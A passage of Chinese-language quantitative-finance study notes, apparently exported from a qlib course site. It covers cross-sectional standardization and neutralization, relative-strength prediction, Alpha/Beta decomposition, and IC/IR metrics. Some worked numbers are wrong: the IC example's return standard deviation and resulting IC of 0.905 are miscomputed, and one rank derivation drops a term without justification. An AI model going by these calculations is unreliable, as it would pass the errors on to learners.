\\frac{1}{N}\\sum_{i=1}^N (y_i - X_i \\beta)\n= \\frac{1}{N}\\left(\\sum_{i=1}^N y_i - \\sum_{i=1}^N X_i \\beta\\right)\n= \\frac{1}{N}\\left(N\\bar{y} - N\\bar{X}\\beta\\right)\n由于 \\hat{\\beta} 是OLS估计，满足正规方程：\nX^T(y - X\\beta) = 0\n即：\n\\sum_{i=1}^N X_i(y_i - X_i \\beta) = 0\n取第一行（截距项，X_{i,0} = 1）：\n\\sum_{i=1}^N (y_i - X_i \\beta) = 0\n\\implies \\frac{1}{N}\\sum_{i=1}^N (y_i - X_i \\beta) = 0\n\\implies E[\\varepsilon] = 0 \\quad \\blacksquare\n命题2：残差与控制变量正交\n证明：\nX^T \\varepsilon = X^T(y - X\\beta) = X^T y - X^T X \\beta\n代入 \\beta = (X^T X)^{-1} X^T y：\n= X^T y - X^T X (X^T X)^{-1} X^T y\n= X^T y - X^T y = 0\n因此：\n\\text{Cov}(\\varepsilon, X) = \\frac{1}{N} X^T \\varepsilon = 0 \\quad \\blacksquare\n金融含义\n残差与控制变量不相关，说明：\n\n残差中不包含行业因子（如果控制变量包含行业哑变量）\n残差中不包含市值因子（如果控制变量包含市值）\n残差是”剔除了风格因子后的纯Alpha”\n\n\n4. 三者组合实践\n4.1 最佳实践流程\n横截面处理通常是多个步骤的组合，最佳实践流程如下：\nStep 1：Z-score标准化\n将不同单位的因子标准化到同一尺度：\n\\text{Factor}_z = \\frac{\\text{Factor} - \\mu}{\\sigma}\nStep 2：中性化\n剔除行业、市值等风格因子：\n\\text{Factor}_{\\text{neu}} = \\text{Factor}_z - X\\beta\n其中 X 是控制变量矩阵（行业、市值等），\\beta 是回归系数。\nStep 3：二次标准化（可选）\n中性化后，因子的分布可能偏离标准正态分布，可以再次标准化：\n\\text{Factor}_{\\text{final}} = \\frac{\\text{Factor}_{\\text{neu}} - \\mu_{\\text{neu}}}{\\sigma_{\\text{neu}}}\n4.2 顺序依赖关系\n顺序A：Z-score → Neutralize ✓\n这是正确的顺序。\n理由：\n\nZ-score将不同单位的因子标准化（如PE和ROE）\n标准化后的因子在同一尺度上，可以放入同一个回归模型\n中性化时，回归系数 \\beta 的单位统一，解释性更强\n\n顺序B：Neutralize → Z-score ✗\n这是错误的顺序。\n问题：\n\n中性化前的因子量纲不同（PE=倍数，ROE=百分比）\n回归系数 \\beta 的单位不统一，解释性差\n不同因子的残差不在同一尺度上，难以比较\n\n4.3 性能优化技巧\n技巧1：向量化回归\n对于大型数据集（如A股5000只股票），应该使用向量化回归，而不是for循环：\n慢（for循环）：\nfor t in time_grid:\n    for i in range(N):\n        residual[i] = factor[i] - sum(beta[j] * control[i, j] for j in range(K))\n快（向量化）：\nresidual = factor - X @ beta\n技巧2：行业哑变量稀疏矩阵存储\n行业哑变量矩阵 X 是稀疏的（大部分元素为0），应该使用稀疏矩阵存储：\n节省内存：\n\n密集矩阵：5000 \\times 30 个float，约 1.2 MB\n稀疏矩阵：只存储非零元素，约 0.05 MB（节省96%）\n\n技巧3：批量中性化\n对于时间序列数据，可以批量中性化：\n# 一次性中性化所有时刻\nresidual_matrix = factor_matrix - X @ beta_matrix\n而不是逐时刻中性化：\n# 逐时刻中性化（慢）\nfor t in range(T):\n    residual_matrix[t] = factor_matrix[t] - X @ beta[t]\n\n5. 总结\n横截面标准化与中性化是量化投资中从”绝对预测”到”相对强弱”转变的关键技术。\n核心要点回顾\n\n\nZ-score：\n\n公式：z = (x - \\mu) / \\sigma\n金融含义：偏离均值的标准差倍数\n优势：不同单位因子可线性组合\n劣势：对异常值敏感\n\n\n\nRank：\n\n公式：z = (r - 1) / (N - 1)，其中 r 是排序位置\n金融含义：只在乎”谁比谁强”，不在乎强多少\n优势：对异常值鲁棒\n劣势：丢失数值信息\n\n\n\nNeutralization：\n\n公式：\\varepsilon = y - X\\beta\n金融含义：剔除风格因子后的纯Alpha\n优势：纯化信号，剥离风格暴露\n劣势：计算复杂\n\n\n\n组合实践：\n\n最佳顺序：Z-score → Neutralize → (可选)再次标准化\n性能优化：向量化回归、稀疏矩阵、批量处理\n\n\n\n量化投资哲学的转变\n通过横截面标准化和中性化，量化投资的思维发生了质的变化：\n从”预测价格”到”预测相对强弱”：\n\n传统：预测股票A明天涨不涨\n现代：预测股票A明天是否比股票B强\n\n从”赚取Beta”到”提取Alpha”：\n\n传统：赌行业轮动、风格切换\n现代：剔除风格，只捕获纯Alpha\n\n从”追求精确”到”追求稳定”：\n\n传统：预测具体价格（难）\n现代：预测相对排名（容错率高）\n\n横截面处理不是数学技巧，而是一种投资策略：\n\n我们不赌国运涨跌，也不赌行业轮动，我们只赌”同一环境下，谁比谁强”。\n\n在下一文档中，我们将深入探讨另一个核心主题：Horizon对齐（Label Shift），这是消除未来函数并建立因果预测关系的关键技术。"},"quant/qlib/week1/04-相对强弱预测的量化思维":{"slug":"quant/qlib/week1/04-相对强弱预测的量化思维","filePath":"quant/qlib/week1/04-相对强弱预测的量化思维.md","title":"04-相对强弱预测的量化思维","links":[],"tags":[],"content":"从绝对预测到相对强弱的量化思维转变\n引言\n在量化投资中，“预测相对强弱”而非”预测绝对价格”是区分”散户思维”与”机构量化思维”的分水岭。这个转变不仅是技术层面的，更是思维层面的质变。\n本文将从绝对预测与相对预测的本质差异、市场噪声过滤机制、Alpha/Beta分解理论、评估指标详解等多个维度，全面解析”预测相对强弱”的量化思维。\n\n1. 绝对预测 vs 相对预测的本质\n1.1 绝对预测定义\n目标：预测资产价格或收益率的绝对值。\n数学形式：\n\\text{Model}: \\mathbf{X}_t \\to P_{t+h} \\text{ 或 } R_{t+h}\n其中：\n\n\\mathbf{X}_t：t 时刻的因子特征\nP_{t+h}：t+h 时刻的绝对价格\nR_{t+h}：t+h 时刻的收益率\n\n示例：\n\n“明天茅台涨不涨？”\n“上证指数下个月到多少点？”\n“比特币年底价格是多少？”\n\n评价体系：\n\n准确率（Accuracy）：预测方向正确的比例\n均方误差（MSE）：预测值与真实值的平方误差\n均方根误差（RMSE）：预测值与真实值的误差平方根\n\\text{MSE} = \\frac{1}{N}\\sum_{i=1}^N (y_i - \\hat{y}_i)^2\n\\text{RMSE} = \\sqrt{\\text{MSE}}\n\n1.2 相对预测定义\n目标：预测资产在横截面上的相对强弱（排名）。\n数学形式：\n\\text{Model}: \\mathbf{X}_t \\to \\text{Rank}_t\n其中：\n\n\\mathbf{X}_t：t 时刻的因子特征\n\\text{Rank}_t \\in [0, 1]：资产的横截面排名（标准化到[0,1]）\n\n示例：\n\n“在所有股票里，茅台明天是不是表现最好的那10%？”\n“在所有DeFi协议中，AAVE未来1个月是否跑赢平均？”\n“在所有Token中，BTC未来1周是否排名前20%？”\n\n评价体系：\n\n\n信息系数（IC）：因子值与未来收益的相关系数\n\\text{IC} = \\text{Corr}(F_t, R_{t \\to t+h}) = \\frac{\\text{Cov}(F_t, R_{t \\to t+h})}{\\sigma_{F_t} \\sigma_{R_{t \\to t+h}}}\n\n\n信息比率（IR）：IC的均值与标准差之比\n\\text{IR} = \\frac{\\text{Mean}(\\text{IC})}{\\text{Std}(\\text{IC})}\n\n\n1.3 两种思维的对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度绝对预测相对预测预测目标价格/收益率排名/相对强弱输出空间连续值 \\mathbb{R}排名 [0, 1]噪声敏感性高低容错率低高适用场景趋势跟踪、择时多因子选股、市场中性评价体系RMSE/MAEIC/IR对市场依赖强（依赖Beta）弱（剥离Beta）对精度要求极高中等（只需要相关性）风险控制困难容易（分散投资）\n1.4 数学对比\n绝对预测的困难\n假设我们要预测股票 i 在 t+h 时刻的价格：\nP_{i,t+h} = P_{i,t} \\cdot (1 + R_{i,t \\to t+h})\n其中收益率 R_{i,t \\to t+h} 可以分解为：\nR_{i,t \\to t+h} = \\underbrace{\\beta_i \\cdot R_{m,t \\to t+h}}_{\\text{市场Beta}} + \\underbrace{\\alpha_{i,t \\to t+h}}_{\\text{特质收益}} + \\underbrace{\\varepsilon_{i,t \\to t+h}}_{\\text{噪声}}\n绝对预测的问题：\n\n市场Beta \\beta_i \\cdot R_{m,t \\to t+h}：无法准确预测市场涨跌\n特质收益 \\alpha_{i,t \\to t+h}：信噪比低，难以准确预测\n噪声 \\varepsilon_{i,t \\to t+h}：随机性强，完全无法预测\n\n相对预测的优势\n在横截面上，我们比较的是：\n\\text{Rank}(R_{i,t \\to t+h}) = \\text{Rank}(\\beta_i \\cdot R_{m,t \\to t+h} + \\alpha_{i,t \\to t+h} + \\varepsilon_{i,t \\to t+h})\n由于市场Beta R_{m,t \\to t+h} 对所有股票相同，可以约去：\n\\text{Rank}(R_{i,t \\to t+h}) \\approx \\text{Rank}(\\beta_i + \\alpha_{i,t \\to t+h} + \\varepsilon_{i,t \\to t+h})\n因此，相对预测：\n\n不依赖市场涨跌：市场涨跌对所有股票影响相同，不影响排名\n剥离市场噪声：只关注”谁比谁强”，不关注”强多少”\n降低预测难度：不需要预测绝对收益，只需要预测相对强弱\n\n\n2. 市场噪声过滤机制\n2.1 市场系统性风险模型\n资产收益分解\n根据资本资产定价模型（CAPM），资产收益可以分解为：\nR_{i,t} = \\alpha_i + \\beta_i \\cdot R_{m,t} + \\varepsilon_{i,t}\n其中：\n\nR_{i,t}：资产 i 在 t 时刻的收益\n\\alpha_i：资产 i 的Alpha（特质收益）\n\\beta_i：资产 i 对市场的敏感度\nR_{m,t}：市场在 t 时刻的收益\n\\varepsilon_{i,t}：随机噪声（期望为0，与市场不相关）\n\n扩展到多因子模型：\nR_{i,t} = \\alpha_i + \\sum_{j=1}^K \\beta_{i,j} \\cdot R_{f_j,t} + \\varepsilon_{i,t}\n其中 R_{f_j,t} 是第 j 个因子的收益（如市场、规模、价值等）。\n系统性风险 vs 特质风险：\n\n系统性风险：\\sum_{j=1}^K \\beta_{i,j} \\cdot R_{f_j,t}，无法通过分散投资消除\n特质风险：\\varepsilon_{i,t}，可以通过分散投资消除\n\n2.2 横截面处理的去噪原理\n绝对视角的困境\n假设市场收益率 R_m = -5\\%（普跌5%），我们有两只股票：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n股票AlphaBeta预测收益实际收益A+2%1.0+2%-3%B-3%1.0-3%-8%\n绝对视角：\n\n股票A：预测+2%，实际-3%，误差-5%（看似模型失效）\n股票B：预测-3%，实际-8%，误差-5%（看似模型失效）\n\n相对视角：\n\n横截面比较：A（-3%）&gt; B（-8%）\nAlpha比较：A（+2%）&gt; B（-3%）\n模型有效！A比B强\n\n横截面处理的去噪原理\n在横截面标准化后，我们计算：\nz_{i,t} = \\frac{R_{i,t} - \\mu_t}{\\sigma_t}\n其中 \\mu_t 是 t 时刻的横截面均值，\\sigma_t 是标准差。\n假设市场收益率 R_m = -5\\%，\\mu_t \\approx -5\\%：\nz_A = \\frac{-3\\% - (-5\\%)}{\\sigma_t} = \\frac{2\\%}{\\sigma_t}\nz_B = \\frac{-8\\% - (-5\\%)}{\\sigma_t} = \\frac{-3\\%}{\\sigma_t}\n因此：\n\nz_A &gt; 0：A强于平均水平\nz_B &lt; 0：B弱于平均水平\n\n关键洞察：\n\n横截面处理自动剔除了市场系统性风险 R_m\n只保留特质收益 \\alpha_i 和部分噪声 \\varepsilon_i\n大大降低了预测难度\n\n2.3 实际案例：普跌环境下的表现\n场景设置\n2022年A股熊市，上证指数从3700点跌到3000点，跌幅约-19%。\n因子：动量因子（20日收益率）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n日期上证指数动量因子IC因子IC累计2022-01-0137000.050.052022-02-0136500.040.092022-03-0135500.030.122022-04-0134000.020.142022-05-0132500.010.152022-06-013000-0.010.14\n绝对视角（困惑）：\n\n绝对收益：平均-15%（看似因子失效）\n动量因子IC逐渐下降（因子稳定性变差）\n结论：动量因子在熊市失效？\n\n相对视角（正确）：\n\n虽然全市场普跌，但动量因子IC &gt; 0（因子仍然有效）\n买入前20%股票：平均跌幅-10%\n卖出后20%股票：平均跌幅-20%\n多空收益：-10% - (-20%) = +10%\n\n关键结论：\n\\text{Alpha收益} = \\text{多头收益} - \\text{空头收益}\n= (-10\\%) - (-20\\%) = +10\\%\n\n绝对收益：-15%（市场Beta）\n相对收益（Alpha）：+10%（因子选股能力）\n因子有效！\n\n2.4 市场噪声过滤的数学证明\n命题：横截面标准化可以完全消除系统性风险（假设所有资产Beta相同）。\n证明：\n设市场收益率 R_m，所有资产的Beta相同 \\beta_i = \\beta。\n资产 i 的收益：\nR_i = \\alpha_i + \\beta \\cdot R_m + \\varepsilon_i\n横截面均值：\n\\mu = \\frac{1}{N}\\sum_{i=1}^N R_i = \\frac{1}{N}\\sum_{i=1}^N (\\alpha_i + \\beta \\cdot R_m + \\varepsilon_i)\n= \\bar{\\alpha} + \\beta \\cdot R_m + \\bar{\\varepsilon}\n其中 \\bar{\\alpha} = \\frac{1}{N}\\sum \\alpha_i 是Alpha均值，\\bar{\\varepsilon} = \\frac{1}{N}\\sum \\varepsilon_i 是噪声均值（期望为0）。\n横截面标准化：\nz_i = \\frac{R_i - \\mu}{\\sigma}\n= \\frac{(\\alpha_i + \\beta R_m + \\varepsilon_i) - (\\bar{\\alpha} + \\beta R_m + \\bar{\\varepsilon})}{\\sigma}\n= \\frac{(\\alpha_i - \\bar{\\alpha}) + (\\varepsilon_i - \\bar{\\varepsilon})}{\\sigma}\n= \\frac{\\alpha_i - \\bar{\\alpha}}{\\sigma} + \\frac{\\varepsilon_i - \\bar{\\varepsilon}}{\\sigma}\n由于 E[\\varepsilon_i] = 0，\\bar{\\varepsilon} \\approx 0：\nz_i \\approx \\frac{\\alpha_i - \\bar{\\alpha}}{\\sigma} + \\frac{\\varepsilon_i}{\\sigma}\n结论：\n\n系统性风险 \\beta R_m 被完全消除\n只保留特质收益 \\alpha_i 和噪声 \\varepsilon_i\n横截面处理实现了”市场中性” \\quad \\blacksquare\n\n\n3. Alpha/Beta分解理论\n3.1 CAPM模型基础\n资本资产定价模型（CAPM）：\nE[R_i] = R_f + \\beta_i \\cdot (E[R_m] - R_f)\n其中：\n\nE[R_i]：资产 i 的期望收益\nR_f：无风险收益率\n\\beta_i：资产 i 对市场的敏感度\nE[R_m]：市场的期望收益\nE[R_m] - R_f：市场风险溢价\n\nBeta的定义：\n\\beta_i = \\frac{\\text{Cov}(R_i, R_m)}{\\text{Var}(R_m)}\n经济含义：\n\n\\beta_i = 1：资产收益与市场收益同步\n\\beta_i &gt; 1：资产收益波动大于市场（进攻型）\n\\beta_i &lt; 1：资产收益波动小于市场（防御型）\n\n3.2 Alpha的数学定义与分解\n扩展的CAPM模型（实际收益 vs 期望收益）：\nR_{i,t} = R_f + \\beta_i \\cdot (R_{m,t} - R_f) + \\alpha_{i,t} + \\varepsilon_{i,t}\n其中：\n\n\\alpha_{i,t}：资产 i 在 t 时刻的Alpha（超额收益）\n\\varepsilon_{i,t}：随机噪声（期望为0）\n\nAlpha的定义：\n\\alpha_{i,t} = R_{i,t} - R_f - \\beta_i \\cdot (R_{m,t} - R_f) - \\varepsilon_{i,t}\nAlpha的来源：\nAlpha可以分解为三个来源：\n来源1：选股能力（Stock Selection）\n\\alpha_{\\text{stock}} = \\text{因子选股产生的超额收益}\n示例：动量因子选出的股票平均收益+5%，市场平均收益+2%，选股Alpha=+3%。\n来源2：择时能力（Market Timing）\n\\alpha_{\\text{timing}} = \\text{预测市场涨跌产生的超额收益}\n示例：预测到市场下跌，提前降低仓位，避免了-5%的损失，择时Alpha=+5%。\n来源3：执行能力（Execution）\n\\alpha_{\\text{execution}} = \\text{交易执行产生的超额收益}\n示例：优化交易时机，降低交易成本，执行Alpha=+0.5%。\n总Alpha：\n\\alpha_{\\text{total}} = \\alpha_{\\text{stock}} + \\alpha_{\\text{timing}} + \\alpha_{\\text{execution}}\n3.3 Beta暴露的量化方法\n回归估计\n使用历史数据回归估计Beta：\n\\hat{\\beta}_i = \\frac{\\text{Cov}(R_i, R_m)}{\\text{Var}(R_m)} = \\frac{\\sum_{t=1}^T (R_{i,t} - \\bar{R}_i)(R_{m,t} - \\bar{R}_m)}{\\sum_{t=1}^T (R_{m,t} - \\bar{R}_m)^2}\n其中：\n\nT：历史数据长度\n\\bar{R}_i = \\frac{1}{T}\\sum_{t=1}^T R_{i,t}：资产 i 的平均收益\n\\bar{R}_m = \\frac{1}{T}\\sum_{t=1}^T R_{m,t}：市场平均收益\n\n多因子暴露\n假设有 K 个因子（市场、规模、价值、动量等），资产 i 的收益：\nR_{i,t} = \\alpha_i + \\sum_{j=1}^K \\beta_{i,j} \\cdot R_{f_j,t} + \\varepsilon_{i,t}\n矩阵形式：\n\\mathbf{R}_t = \\boldsymbol{\\alpha} + \\mathbf{B} \\cdot \\mathbf{R}_{f,t} + \\boldsymbol{\\varepsilon}_t\n其中：\n\n\\mathbf{R}_t \\in \\mathbb{R}^N：N 个资产的收益向量\n\\boldsymbol{\\alpha} \\in \\mathbb{R}^N：Alpha向量\n\\mathbf{B} \\in \\mathbb{R}^{N \\times K}：Beta暴露矩阵\n\\mathbf{R}_{f,t} \\in \\mathbb{R}^K：K 个因子的收益向量\n\n回归估计Beta矩阵：\n\\hat{\\mathbf{B}} = (\\mathbf{R}_f^T \\mathbf{R}_f)^{-1} \\mathbf{R}_f^T \\mathbf{R}\n其中 \\mathbf{R}_f \\in \\mathbb{R}^{T \\times K} 是因子收益矩阵，\\mathbf{R} \\in \\mathbb{R}^{T \\times N} 是资产收益矩阵。\nBeta暴露控制\n在构建组合时，我们可以控制Beta暴露：\n\\text{约束：} \\sum_{i=1}^N w_i \\cdot \\beta_{i,j} = 0, \\quad \\forall j\n其中 w_i 是资产 i 的权重。\n示例：市场中性策略\n约束 \\sum w_i \\cdot \\beta_{i,\\text{market}} = 0，确保组合对市场涨跌中性。\n3.4 多因子模型下的Alpha提取\n步骤1：计算因子暴露矩阵\n\\beta_{1,1} &amp; \\beta_{1,2} &amp; \\cdots &amp; \\beta_{1,K} \\\\\n\\beta_{2,1} &amp; \\beta_{2,2} &amp; \\cdots &amp; \\beta_{2,K} \\\\\n\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\n\\beta_{N,1} &amp; \\beta_{N,2} &amp; \\cdots &amp; \\beta_{N,K}\n\\end{bmatrix} $$\n\n其中 $\\beta_{i,j}$ 是资产 $i$ 对因子 $j$ 的暴露。\n\n**步骤2：回归得到因子收益**\n\n$$ \\boldsymbol{\\lambda} = (\\mathbf{B}^T \\mathbf{B})^{-1} \\mathbf{B}^T \\mathbf{R} $$\n\n其中 $\\boldsymbol{\\lambda} \\in \\mathbb{R}^K$ 是 $K$ 个因子的收益向量。\n\n**步骤3：提取Alpha**\n\n$$ \\boldsymbol{\\alpha} = \\mathbf{R} - \\mathbf{B} \\boldsymbol{\\lambda} $$\n\n其中 $\\boldsymbol{\\alpha} \\in \\mathbb{R}^N$ 是 $N$ 个资产的Alpha向量。\n\n**经济含义**：\n\n$$ \\alpha_i = R_i - \\sum_{j=1}^K \\beta_{i,j} \\cdot \\lambda_j $$\n\n$\\alpha_i$ 表示：\n- 剔除了所有风格因子暴露后的纯选股能力\n- 不依赖市场Beta\n- 不依赖规模、价值、动量等风格因子\n- 只捕获&quot;纯Alpha&quot;\n\n### 3.5 Alpha与IC的关系\n\n**命题**：IC是Alpha的横截面相关性。\n\n**证明**：\n\n定义：\n- $F_t$：$t$ 时刻的因子值向量\n- $R_{t \\to t+h}$：$t+h$ 时刻的收益向量\n\nIC的定义：\n\n$$ \\text{IC} = \\text{Corr}(F_t, R_{t \\to t+h}) = \\frac{\\text{Cov}(F_t, R_{t \\to t+h})}{\\sigma_{F_t} \\sigma_{R_{t \\to t+h}}} $$\n\n假设因子已经标准化（$\\sigma_{F_t} = 1$），收益已经中性化（$\\bar{R} = 0$）：\n\n$$ \\text{IC} = \\frac{1}{\\sigma_R} \\cdot \\frac{1}{N} \\sum_{i=1}^N F_{i,t} \\cdot R_{i,t \\to t+h} $$\n\n$$ = \\frac{1}{\\sigma_R} \\cdot \\text{Mean}(F_t \\odot R_{t \\to t+h}) $$\n\n其中 $\\odot$ 是逐元素乘法。\n\n如果因子 $F_t$ 与Alpha $\\alpha_t$ 完全相关（$F_t \\propto \\alpha_t$）：\n\n$$ \\text{IC} \\propto \\text{Mean}(\\alpha_t \\odot R_{t \\to t+h}) $$\n\n由于 $R_{t \\to t+h} = \\alpha_{t \\to t+h} + \\text{Beta} + \\text{Noise}$，且横截面处理已剔除Beta：\n\n$$ \\text{IC} \\propto \\text{Mean}(\\alpha_t \\odot \\alpha_{t \\to t+h}) $$\n\n**结论**：IC度量的是因子与未来Alpha的横截面相关性 $\\quad \\blacksquare$\n\n---\n\n## 4. 评估指标详解\n\n### 4.1 IC（信息系数）\n\n**定义**\n\nIC（Information Coefficient，信息系数）是因子值与未来收益的相关系数。\n\n**公式**：\n\n$$ \\text{IC}_t = \\text{Corr}(F_t, R_{t \\to t+h}) = \\frac{\\text{Cov}(F_t, R_{t \\to t+h})}{\\sigma_{F_t} \\sigma_{R_{t \\to t+h}}} $$\n\n其中：\n- $F_t$：$t$ 时刻的因子值向量\n- $R_{t \\to t+h}$：$t+h$ 时刻的收益向量\n- $\\sigma_{F_t}$：因子值的横截面标准差\n- $\\sigma_{R_{t \\to t+h}}$：收益的横截面标准差\n\n**计算示例**\n\n假设有5只股票：\n\n| 股票 | 因子值 | 未来收益 |\n|------|--------|---------|\n| A | 1.5 | +5% |\n| B | 1.0 | +2% |\n| C | 0.5 | 0% |\n| D | 0.0 | -2% |\n| E | -0.5 | -5% |\n\n**计算均值**：\n\n$$ \\bar{F} = (1.5 + 1.0 + 0.5 + 0.0 - 0.5) / 5 = 0.5 $$\n$$ \\bar{R} = (5\\% + 2\\% + 0\\% - 2\\% - 5\\%) / 5 = 0\\% $$\n\n**计算标准差**：\n\n$$ \\sigma_F = \\sqrt{((1.5-0.5)^2 + (1.0-0.5)^2 + \\cdots + (-0.5-0.5)^2) / 5} = 0.707 $$\n$$ \\sigma_R = \\sqrt{((5\\%-0)^2 + (2\\%-0)^2 + \\cdots + (-5\\%-0)^2) / 5} = 3.74\\% $$\n\n**计算协方差**：\n\n$$ \\text{Cov} = \\frac{1}{5} \\sum_{i=1}^5 (F_i - \\bar{F})(R_i - \\bar{R}) $$\n\n$$ = \\frac{1}{5} [(1.5-0.5)(5\\%-0) + (1.0-0.5)(2\\%-0) + \\cdots + (-0.5-0.5)(-5\\%-0)] $$\n\n$$ = \\frac{1}{5} [1 \\cdot 5\\% + 0.5 \\cdot 2\\% + 0 \\cdot 0\\% + (-0.5) \\cdot (-2\\%) + (-1) \\cdot (-5\\%)] $$\n\n$$ = \\frac{1}{5} [5\\% + 1\\% + 0\\% + 1\\% + 5\\%] = \\frac{12\\%}{5} = 2.4\\% $$\n\n**计算IC**：\n\n$$ \\text{IC} = \\frac{\\text{Cov}}{\\sigma_F \\sigma_R} = \\frac{2.4\\%}{0.707 \\times 3.74\\%} = 0.905 $$\n\n**解释**：\n\n- IC = 0.905：因子与未来收益高度正相关\n- IC = 0.05：因子与未来收益弱正相关\n- IC = 0：因子与未来收益不相关\n- IC = -0.05：因子与未来收益弱负相关\n\n**经济含义**：\n\n- IC = 0.05：因子解释了 $0.05^2 = 0.25\\%$ 的收益方差\n- IC = 0.1：因子解释了 $0.1^2 = 1\\%$ 的收益方差\n- IC = 0.2：因子解释了 $0.2^2 = 4\\%$ 的收益方差\n\n**阈值**：\n\n- IC &gt; 0.05：有效的因子\n- IC &gt; 0.08：非常好的因子\n- IC &gt; 0.1：极好的因子（在A股市场中罕见）\n\n**统计显著性检验**：\n\n$$ t = \\text{IC} \\cdot \\sqrt{\\frac{N}{1 - \\text{IC}^2}} $$\n\n其中 $N$ 是横截面股票数。\n\n**示例**：IC = 0.05，N = 500\n\n$$ t = 0.05 \\cdot \\sqrt{\\frac{500}{1 - 0.05^2}} = 0.05 \\cdot \\sqrt{502.5} = 1.12 $$\n\n查t分布表：\n- $t &gt; 2$：显著（95%置信度）\n- $t &gt; 2.58$：非常显著（99%置信度）\n\n本例 $t = 1.12 &lt; 2$，不显著，说明IC = 0.05可能来自随机噪声。\n\n### 4.2 Rank IC（排序相关系数）\n\n**定义**\n\nRank IC是因子排名与收益排名的Spearman相关系数。\n\n**公式**：\n\n$$ \\text{RankIC}_t = \\text{Corr}(\\text{Rank}(F_t), \\text{Rank}(R_{t \\to t+h})) $$\n\n其中 $\\text{Rank}(\\cdot)$ 是排序函数。\n\n**计算示例**\n\n使用前面的例子：\n\n| 股票 | 因子值 | 排名 | 未来收益 | 排名 |\n|------|--------|------|---------|------|\n| A | 1.5 | 5 | +5% | 5 |\n| B | 1.0 | 4 | +2% | 4 |\n| C | 0.5 | 3 | 0% | 3 |\n| D | 0.0 | 2 | -2% | 2 |\n| E | -0.5 | 1 | -5% | 1 |\n\n**计算Spearman相关系数**：\n\n由于排名完全一致，Rank IC = 1.0。\n\n**优势**：\n\n- **对异常值鲁棒**：只看排名，不看具体数值\n- **适合非线性关系**：可以捕捉单调但不线性的关系\n- **适合偏态分布**：因子或收益分布严重偏态时仍然有效\n\n**IC vs Rank IC**：\n\n| 维度 | IC | Rank IC |\n|------|----|----|\n| **计算方式** | Pearson相关 | Spearman相关 |\n| **对异常值** | 敏感 | 鲁棒 |\n| **关系假设** | 线性 | 单调 |\n| **适用场景** | 正态分布 | 任意分布 |\n| **信息损失** | 小 | 大 |\n\n**何时使用Rank IC**：\n\n- 因子或收益分布严重偏态\n- 存在极端异常值\n- 因子与收益的关系是非线性的\n\n### 4.3 IR（信息比率）\n\n**定义**\n\nIR（Information Ratio，信息比率）是IC的均值与标准差之比，度量因子的稳定性。\n\n**公式**：\n\n$$ \\text{IR} = \\frac{\\text{Mean}(\\text{IC})}{\\text{Std}(\\text{IC})} = \\frac{\\bar{\\text{IC}}}{\\sigma_{\\text{IC}}} $$\n\n其中：\n- $\\text{Mean}(\\text{IC})$：IC的时间序列均值\n- $\\text{Std}(\\text{IC})$：IC的时间序列标准差\n\n**计算示例**\n\n假设5个月的IC序列：\n\n| 月份 | IC |\n|------|----|\n| 1 | 0.08 |\n| 2 | 0.06 |\n| 3 | 0.04 |\n| 4 | 0.02 |\n| 5 | 0.00 |\n\n**计算均值**：\n\n$$ \\bar{\\text{IC}} = (0.08 + 0.06 + 0.04 + 0.02 + 0.00) / 5 = 0.04 $$\n\n**计算标准差**：\n\n$$ \\sigma_{\\text{IC}} = \\sqrt{\\frac{(0.08-0.04)^2 + (0.06-0.04)^2 + \\cdots + (0.00-0.04)^2}{5}} = 0.028 $$\n\n**计算IR**：\n\n$$ \\text{IR} = \\frac{0.04}{0.028} = 1.43 $$\n\n**经济含义**：\n\n- IR &gt; 1：非常稳定的因子\n- IR &gt; 0.7：稳定的因子\n- IR &gt; 0.5：可用的因子\n- IR &lt; 0.5：因子不稳定\n\n**IR的重要性**：\n\nIR比IC更重要，因为：\n1. 高IC但低IR：因子表现不稳定，今天IC=0.1，明天IC=-0.05，无法实战\n2. 中IC但高IR：因子表现稳定，IC长期维持在0.03-0.05之间，可以实战\n\n**示例对比**：\n\n| 因子 | IC均值 | IC标准差 | IR | 评价 |\n|------|--------|---------|----|----|\n| A | 0.10 | 0.15 | 0.67 | 不稳定（波动大） |\n| B | 0.05 | 0.05 | 1.00 | 稳定（波动小） |\n| C | 0.03 | 0.02 | 1.50 | 非常稳定 |\n\n**结论**：因子B虽然IC较低，但IR高，实战效果可能更好。\n\n---\n\n## 5. 量化投资哲学探讨\n\n### 5.1 随机游走 vs 趋势跟踪\n\n**随机游走假设（Random Walk Hypothesis）**\n\n$$ P_{t+1} = P_t + \\varepsilon_{t+1} $$\n\n其中 $\\varepsilon_{t+1}$ 是白噪声，期望为0。\n\n**推论**：\n- 价格变化不可预测\n- IC应接近0\n- 策略无法获得超额收益\n- 赚取市场Beta\n\n**趋势跟踪假设（Trend Following Hypothesis）**\n\n$$ P_{t+1} = P_t + \\alpha_t + \\varepsilon_{t+1} $$\n\n其中 $\\alpha_t$ 是趋势信号，期望不为0。\n\n**推论**：\n- 价格存在趋势\n- IC &gt; 0（动量效应）\n- 策略可以获得超额收益\n- 赚取趋势Alpha\n\n**实证证据**：\n\n- **短期（1-5天）**：IC ≈ 0.02-0.04，动量效应弱\n- **中期（5-20天）**：IC ≈ 0.05-0.08，动量效应中等\n- **长期（20-60天）**：IC ≈ 0.08-0.12，动量效应强\n\n**结论**：\n- 价格不完全随机，存在一定的趋势\n- 趋势跟踪策略在A股市场有效\n- 但需要通过横截面处理剥离市场风险\n\n### 5.2 有效市场 vs 套利机会\n\n**有效市场假说（Efficient Market Hypothesis, EMH）**\n\n**强有效市场**：\n- 价格反映所有信息（包括内幕信息）\n- Alpha应消失\n- 无法获得超额收益\n\n**半强有效市场**：\n- 价格反映所有公开信息\n- Alpha应消失\n- 无法通过基本面分析获得超额收益\n\n**弱有效市场**：\n- 价格反映历史价格信息\n- 技术分析无效\n- 但基本面分析可能有效\n\n**行为金融（Behavioral Finance）**\n\n投资者非理性：\n- 过度自信（Overconfidence）\n- 损失厌恶（Loss Aversion）\n- 羊群效应（Herding）\n- 锚定效应（Anchoring）\n\n**推论**：\n- Alpha长期存在\n- 套利机会长期存在\n- 但套利能力有限（风险、成本、流动性）\n\n**A股市场的实证证据**：\n\n- **因子收益**：价值、动量、质量因子长期IC &gt; 0.05\n- 